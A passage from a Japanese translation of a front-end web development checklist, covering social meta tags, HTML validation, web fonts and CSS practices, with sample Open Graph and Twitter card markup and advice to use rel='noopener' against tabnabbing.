<input type="checkbox" class="task-list-item-checkbox" disabled><strong>条件分岐コメント:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> もし必要なら、IE 用の条件分岐コメントタグが設置されている。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://msdn.microsoft.com/en-us/library/ms537512(v=vs.85).aspx" rel="nofollow noopener" target="_blank">About conditional comments (Internet Explorer) - MSDN - Microsoft</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>RSS フィード:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> もしあなたのサイトがブログ、もしくは記事をもっているなら、RSS へのリンクが提供されている。</p></li>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>インラインクリティカル CSS:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> ページロード時にすぐに表示される部分のコンテンツを整える CSS は（"above the fold content"）、クリティカル CSS によってコールされている。それは、主要な CSS の前の <code>&lt;style&gt;&lt;/style&gt;</code> の間に記述されている。（圧縮されている）</p></li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://github.com/addyosmani/critical" rel="nofollow noopener" target="_blank">Critical by Addy Osmani on GitHub</a> は、これを自動的に行います。</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>CSS 読み込み順:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべての CSS ファイルは <code>&lt;head&gt;</code> 内でいかなる JavaScript よりも先に読み込まれている。 (JS ファイルが時々非同期にあなたのページのトップに読み込まれる場合を除く。)</li>
</ul>

<h3>
<span id="ソーシャル" class="fragment"></span><a href="#%E3%82%BD%E3%83%BC%E3%82%B7%E3%83%A3%E3%83%AB"><i class="fa fa-link"></i></a>ソーシャル</h3>

<p><strong><em>Facebook OG</em></strong> と <strong><em>Twitter Cards</em></strong> は、すべてのウェブサイトに強く推奨します。 その他のソーシャルメディア用のタグは、特定の対象をターゲットとする際に、より確実に表示されるようになるでしょう。</p>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Facebook Open Graph:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> すべての Facebook Open Graph (OG) はテストされ、不足がなく不具合もない。画像サイズは少なくとも 600 x 315 ピクセル以上であり、1200 x 630 ピクセルを推奨する。</li>
</ul>

<blockquote>
<p><strong>備考:</strong> <code>og:image:width</code> と <code>og:image:height</code> を使用して画像の縦横サイズを指定すると、非同期にダウンロードして処理することなく、即座に画像をレンダリングすることができます。</p>
</blockquote>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">property</span><span class="o">=</span><span class="s">"og:type"</span> <span class="na">content</span><span class="o">=</span><span class="s">"website"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">property</span><span class="o">=</span><span class="s">"og:url"</span> <span class="na">content</span><span class="o">=</span><span class="s">"https://example.com/page.html"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">property</span><span class="o">=</span><span class="s">"og:title"</span> <span class="na">content</span><span class="o">=</span><span class="s">"Content Title"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">property</span><span class="o">=</span><span class="s">"og:image"</span> <span class="na">content</span><span class="o">=</span><span class="s">"https://example.com/image.jpg"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">property</span><span class="o">=</span><span class="s">"og:description"</span> <span class="na">content</span><span class="o">=</span><span class="s">"Description Here"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">property</span><span class="o">=</span><span class="s">"og:site_name"</span> <span class="na">content</span><span class="o">=</span><span class="s">"Site Name"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">property</span><span class="o">=</span><span class="s">"og:locale"</span> <span class="na">content</span><span class="o">=</span><span class="s">"en_US"</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">property</span><span class="o">=</span><span class="s">"og:image:width"</span> <span class="na">content</span><span class="o">=</span><span class="s">"1200"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">property</span><span class="o">=</span><span class="s">"og:image:height"</span> <span class="na">content</span><span class="o">=</span><span class="s">"630"</span><span class="p">&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>📖 <a href="https://developers.facebook.com/docs/sharing/webmasters/" rel="nofollow noopener" target="_blank">A Guide to Sharing for Webmasters</a>
</li>
<li>🛠 <a href="https://developers.facebook.com/tools/debug/" rel="nofollow noopener" target="_blank">Facebook OG testing</a> であなたのサイトをテストしましょう。</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Twitter Card:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a>
</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"twitter:card"</span> <span class="na">content</span><span class="o">=</span><span class="s">"summary"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"twitter:site"</span> <span class="na">content</span><span class="o">=</span><span class="s">"@site_account"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"twitter:creator"</span> <span class="na">content</span><span class="o">=</span><span class="s">"@individual_account"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"twitter:url"</span> <span class="na">content</span><span class="o">=</span><span class="s">"https://example.com/page.html"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"twitter:title"</span> <span class="na">content</span><span class="o">=</span><span class="s">"Content Title"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"twitter:description"</span> <span class="na">content</span><span class="o">=</span><span class="s">"Content description less than 200 characters"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"twitter:image"</span> <span class="na">content</span><span class="o">=</span><span class="s">"https://example.com/image.jpg"</span><span class="p">&gt;</span>
</pre></div></div>

<blockquote>
<ul>
<li>📖 <a href="https://developer.twitter.com/en/docs/tweets/optimize-with-cards/guides/getting-started" rel="nofollow noopener" target="_blank">Getting started with cards — Twitter Developers</a>
</li>
<li>🛠 <a href="https://cards-dev.twitter.com/validator" rel="nofollow noopener" target="_blank">Twitter card validator</a> であなたのサイトのテストをしましょう。</li>
</ul>
</blockquote>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="html" class="fragment"></span><a href="#html"><i class="fa fa-link"></i></a>HTML</h2>

<h3>
<span id="ベストプラクティス" class="fragment"></span><a href="#%E3%83%99%E3%82%B9%E3%83%88%E3%83%97%E3%83%A9%E3%82%AF%E3%83%86%E3%82%A3%E3%82%B9"><i class="fa fa-link"></i></a>ベストプラクティス</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>HTML5 セマンティック要素:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> HTML5 セマンティック要素が適切に使用されている。(header, section, footer, main...)</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="http://htmlreference.io/" rel="nofollow noopener" target="_blank">HTML Reference</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>エラーページ:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> 404 及び 5xx 用のエラーページが存在している。5xx エラーページは CSS が内蔵されている必要があることを覚えておくこと。（サーバーに対する追加のリクエストを行わないこと。）</p></li>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>Noopener:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> <code>target="_blank"</code> で外部リンクを使用する際には、<code>rel="noopener"</code> 属性をつけて Tabnabbing 脆弱性を防ぐこと。もしあなたが古いバージョンの Firefox をサポートする必要があるなら、<code>rel="noopener noreferrer"</code> を使用すること。</p></li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://mathiasbynens.github.io/rel-noopener/" rel="nofollow noopener" target="_blank">About rel=noopener</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>不必要なコード:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> 不必要なコードは、本番環境にアップロードされる前に削除されていること。</li>
</ul>

<h3>
<span id="html-のテスト" class="fragment"></span><a href="#html-%E3%81%AE%E3%83%86%E3%82%B9%E3%83%88"><i class="fa fa-link"></i></a>HTML のテスト</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>W3C 準拠:</strong>: <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべてのページを HTML バリデーターでテストして、問題点を抽出する。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://validator.w3.org/" rel="nofollow noopener" target="_blank">W3C validator</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>HTML Lint:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> ツールを使って HTML に問題があるかどうかを分析する。</li>
</ul>

<blockquote>
<ul>
<li><p>🛠 <a href="https://dirtymarkup.com/" rel="nofollow noopener" target="_blank">Dirty markup</a></p></li>
<li><p>🛠 <a href="https://sonarwhal.com/" rel="nofollow noopener" target="_blank">Sonar a linting tool for the web</a></p></li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>リンクチェッカー:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> リンク切れがなく、404 エラーが発生しないことを確認する。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://validator.w3.org/checklink" rel="nofollow noopener" target="_blank">W3C Link Checker</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>広告ブロッカーテスト:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 広告ブロッカーが有効でもコンテンツが正しく表示されている。（ユーザーに対してそれらの広告ブロッカーを無効化するようメッセージを表示することができる。）</li>
</ul>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="ウェブフォント" class="fragment"></span><a href="#%E3%82%A6%E3%82%A7%E3%83%96%E3%83%95%E3%82%A9%E3%83%B3%E3%83%88"><i class="fa fa-link"></i></a>ウェブフォント</h2>

<blockquote>
<p><strong>備考:</strong> Webフォントを使用すると、スタイルが適用されていないテキストが表示される現象（FFlash Of Unstyled Text）や フォントがロードされるまで表示されない現象（Flash of Invisible Text）が発生する可能性があります。フォールバックフォントを使用するか、ウェブフォントローダーを使用して動作を制御することを検討してください。<br>
* 📖 <a href="https://developers.google.com/fonts/docs/technical_considerations" rel="nofollow noopener" target="_blank">Google Technical considerations about webfonts</a></p>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>ウェブフォントのフォーマット:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> WOFF, WOFF2 及び TTF はすべてのモダンブラウザでサポートされている。</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://caniuse.com/#feat=woff" rel="nofollow noopener" target="_blank">WOFF - Web Open Font Format - Caniuse</a>.</li>
<li>📖 <a href="https://caniuse.com/#feat=woff2" rel="nofollow noopener" target="_blank">WOFF 2.0 - Web Open Font Format - Caniuse</a>.</li>
<li>📖 <a href="https://caniuse.com/#feat=ttf" rel="nofollow noopener" target="_blank">TTF/OTF - TrueType and OpenType font support</a>
</li>
<li>📖 <a href="https://css-tricks.com/snippets/css/using-font-face/" rel="nofollow noopener" target="_blank">Using @font-face - CSS-Tricks</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>ウェブフォントのサイズ:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> ウェブフォントのサイズは、すべての綴りが含まれた状態で 2MB を超えないこと。</p></li>
<li class="task-list-item"><p><input type="checkbox" class="task-list-item-checkbox" disabled><strong>ウェブフォントローダー:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> ウェブフォントローダーで、ロード時の挙動を制御する。</p></li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://github.com/typekit/webfontloader" rel="nofollow noopener" target="_blank">Typekit Web Font Loader</a>
</li>
</ul>
</blockquote>

<p><strong><a href="#%E7%9B%AE%E6%AC%A1">⬆ トップに戻る</a></strong></p>

<hr>

<h2>
<span id="css" class="fragment"></span><a href="#css"><i class="fa fa-link"></i></a>CSS</h2>

<blockquote>
<p><strong>備考:</strong> 多くのフロントエンド開発者が従っている <a href="https://cssguidelin.es/" rel="nofollow noopener" target="_blank">CSS guidelines</a> と <a href="https://sass-guidelin.es/" rel="nofollow noopener" target="_blank">Sass Guidelines</a> を見てみましょう。 もし CSS プロパティについて疑問があるなら、<a href="http://cssreference.io/" rel="nofollow noopener" target="_blank">CSS Reference</a> に訪れてみましょう。また一貫性を学ぶための短めの <a href="http://codeguide.co/" rel="nofollow noopener" target="_blank">Code Guide</a> もあります。</p>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Responsive Web Design:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> そのウェブサイトはレスポンシブデザインを採用している。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>CSS Print:</strong> <a href="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ba1dfac7780cf1516591021b2fdf5cac812dff3/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6d656469756d2e737667" alt="Medium" data-canonical-src="https://front-end-checklist.now.sh/medium.svg"></a> 印刷用のスタイルシートがそれぞれのページに対して正しく提供されている。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Preprocessors:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> あなたのサイトは CSS プリプロセッサーを使用している。 (<a href="http://sass-lang.com/" rel="nofollow noopener" target="_blank">Sass</a> が推奨される。)</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Unique ID:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> もし ID が使用されているなら、そのページの中でユニークであること。</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>Reset CSS:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> CSS のリセット (reset, normalize または reboot) が使用されており最新である。 <em>(もしあなたが Bootstrap や Foundation などの CSS フレームワークを使用しているなら、それらはすでに導入されている。)</em>
</li>
</ul>

<blockquote>
<ul>
<li>📖 <a href="https://meyerweb.com/eric/tools/css/reset/" rel="nofollow noopener" target="_blank">Reset.css</a>
</li>
<li>📖 <a href="https://necolas.github.io/normalize.css/" rel="nofollow noopener" target="_blank">Normalize.css</a>
</li>
<li>📖 <a href="https://getbootstrap.com/docs/4.0/content/reboot/" rel="nofollow noopener" target="_blank">Reboot</a>
</li>
</ul>
</blockquote>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>JS prefix:</strong> <a href="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/259df4f70b90fc0d0442f44c9fc61f46a05fa84b/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f6c6f772e737667" alt="Low" data-canonical-src="https://front-end-checklist.now.sh/low.svg"></a> すべての class (または JavaScript で使用されいる ID) は、<strong>js-</strong> で始まっており、それらは CSS で使用されていない。</li>
</ul>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"js-slider"</span> <span class="na">class</span><span class="o">=</span><span class="s">"my-slider"</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"id-used-by-cms"</span> <span class="na">class</span><span class="o">=</span><span class="s">"js-slider my-slider"</span><span class="p">&gt;</span>
</pre></div></div>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>内部 CSS 及びインラインスタイル:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> <code>&lt;style&gt;</code> による内部 CSS やインラインスタイルを使用することを避け、正当な理由でのみ使用する。（例： スライダー用の背景画像や CSS クリティカルなど）</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>ベンダープレフィックス:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> CSS ベンダープレフィックスが、ブラウザの互換性に基づいて生成され、使用されている。</li>
</ul>

<blockquote>
<ul>
<li>🛠 <a href="https://autoprefixer.github.io/" rel="nofollow noopener" target="_blank">Autoprefixer CSS online</a>
</li>
</ul>
</blockquote>

<h3>
<span id="パフォーマンス" class="fragment"></span><a href="#%E3%83%91%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%B3%E3%82%B9"><i class="fa fa-link"></i></a>パフォーマンス</h3>

<ul>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>ファイルの結合:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> CSS ファイルが結合されている。 <em>(HTTP/2 では不要)</em>
</li>
<li class="task-list-item">
<input type="checkbox" class="task-list-item-checkbox" disabled><strong>圧縮（Minify）:</strong> <a href="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/5ec7773973d79dd43edd25d7b32de1767bf131ef/68747470733a2f2f66726f6e742d656e642d636865636b6c6973742e6e6f772e73682f686967682e737667" alt="High" data-canonical-src="https://front-end-checklist.now.sh/high.svg"></a> すべての CSS ファイルは圧縮されている。</li>
<li class="task-list-item">
